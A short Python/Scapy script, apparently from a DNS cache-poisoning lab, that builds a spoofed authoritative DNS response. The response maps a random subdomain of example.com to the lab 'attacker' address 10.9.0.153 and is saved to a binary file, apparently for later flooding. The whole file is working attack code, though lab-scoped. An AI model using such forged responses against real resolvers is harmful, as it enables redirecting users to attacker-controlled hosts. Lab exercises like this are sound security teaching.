#!/usr/bin/env python3
from scapy.all import*
# Construct the DNS header and payload
name   = 'twysw.example.com'
domain = 'ns.attacker32.com'
ns = '10.9.0.153'

Qdsec  = DNSQR(qname=name)
Anssec = DNSRR(rrname=name, type='A', rdata='10.9.0.153', ttl=259200)
NSsec  = DNSRR(rrname=domain, type='NS', rdata= ns, ttl=259200)
dns    = DNS(id=0xAAAA, aa=1, rd=0, qr=1,qdcount=1, ancount=1, nscount=0, arcount=0,qd=Qdsec, an=Anssec)
# Construct the IP, UDP headers, and the entire packet
ip  = IP(dst='10.9.0.53', src='10.9.0.153', chksum=0)
udp = UDP(dport=33333, sport=53, chksum=0)
response = ip/udp/dns
# Save the packet to a file
with open('ip_resp.bin', 'wb') as f:
    f.write(bytes(response))
